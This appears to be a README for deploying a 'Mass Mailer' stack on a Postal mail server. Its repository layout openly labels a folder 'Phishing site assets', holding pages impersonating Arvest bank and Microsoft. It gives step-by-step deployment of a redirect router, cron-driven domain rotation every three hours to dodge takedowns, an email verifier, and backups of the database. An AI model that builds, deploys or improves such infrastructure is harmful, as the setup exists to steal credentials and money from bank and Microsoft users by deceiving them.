# Mass Mailer — VPS Deployment & Recovery

Everything you need to deploy the custom stack on top of a fresh Postal installation.

---

## Quick Start (New VPS)

**Prerequisites (done manually first):**
- Ubuntu/Debian VPS with root access
- [Postal](https://docs.postalserver.io/) installed with its bundled Caddy
- PM2 installed (`npm install -g pm2`)

**Then run one command:**

```bash
cd /root/vps-setup
./deploy.sh <YOUR_VPS_IP>
```

Example:

```bash
./deploy.sh 91.229.239.152
```

That's it. The script handles everything — configs, rotation system, router, app files, Caddy reload, PM2 services, and cron jobs.

---

## Repository Structure

```text
vps-setup/
├── deploy.sh                # One-command deployment script (run this)
├── restore.sh               # Full disaster recovery (Docker + DB + everything)
├── auto-sync.sh             # Daily backup to GitHub (runs via cron)
├── configs/                 # Source config files (templates)
│   ├── Caddyfile            # Caddy reverse proxy config (auto-generated)
│   ├── postal.yml           # Postal mail server config
│   ├── signing.key          # Fast signing key for Postal
│   ├── apps-map.json        # App → domain mapping
│   ├── rotate-domains.sh    # Generates Caddyfile from apps-map.json
│   ├── rotate-app.sh        # Rotate a single app to a new domain
│   ├── rotate-all-apps.sh   # Rotate ALL apps (runs via cron)
│   ├── router.js            # Central redirect router (port 3005)
│   └── dynamic_domains.caddy
├── apps/                    # Phishing site assets
│   ├── arvest/
│   │   ├── index.html
│   │   └── ...
│   ├── microsoft/
│   └── mailef-backend/      # Backend source code backup
├── cron/
│   └── root-crontab         # Backup of active crontab
├── database/
│   └── all_databases.sql    # MariaDB dump
├── README.md
└── ADD_NEW_APP.md
```

---

## What `deploy.sh` Does

| Step | Action |
|---|---|
| 1 | Validates prerequisites (Docker, Postal Caddy, PM2) |
| 2 | Creates `/opt/mass-mailer/` directory structure |
| 3 | Updates all IP references from default → your VPS IP |
| 4 | Copies rotation scripts, router, and configs |
| 5 | Symlinks app files so Caddy can serve them |
| 6 | Generates Caddyfile & reloads Caddy |
| 7 | Starts PM2 services (backend, verifier, central router) |
| 8 | Installs cron jobs (domain rotation + daily backup) |
| 9 | Saves PM2 process list |

---

## Custom Directory Structure (on VPS)

After `deploy.sh` runs, all custom files live under `/opt/mass-mailer/`:

```text
/opt/mass-mailer/
├── rotation/
│   ├── apps-map.json         # App → domain mapping (CRITICAL)
│   ├── rotate-domains.sh     # Caddyfile generator
│   ├── rotate-app.sh         # Single app rotation
│   └── rotate-all-apps.sh    # Rotate all apps
├── router/
│   └── router.js             # Central redirect service (port 3005)
├── apps/
│   ├── arvest/               # App assets
│   └── microsoft/
├── mailef-backend/           # Backend application
└── email-verifier/           # Email verifier service
```

Symlinks at `/opt/postal/caddy-data/apps/<app>` → `/opt/mass-mailer/apps/<app>` let Caddy serve the files.

---

## Verification

After deployment:

```bash
# PM2 status
pm2 list

# Generated Caddyfile
cat /opt/postal/config/Caddyfile

# Test central router
curl -I http://central.<YOUR_IP>.sslip.io/arvest

# Test app page
curl -I https://app-<ID>.<YOUR_IP>.sslip.io

# Test API
curl -I https://api.maileff.space/health
```

---

## Automated Backups

The daily cron at 2:00 AM runs `auto-sync.sh` which:

1. Copies configs from `/opt/mass-mailer/rotation/` and `/opt/mass-mailer/router/` back to the repo
2. Copies app files from `/opt/mass-mailer/apps/` back to the repo
3. Dumps the MariaDB database
4. Commits and pushes everything to GitHub

```bash
# Manual backup trigger
/root/vps-setup/auto-sync.sh

# Check backup logs
cat /var/log/vps-backup.log
```

---

## Security

- **Private repo** — contains sensitive configs, keys, and database dumps
- **Domain rotation** — all app domains change every 3 hours automatically
- **Logs to check:** `/var/log/domain-rotation.log`, `/var/log/vps-backup.log`
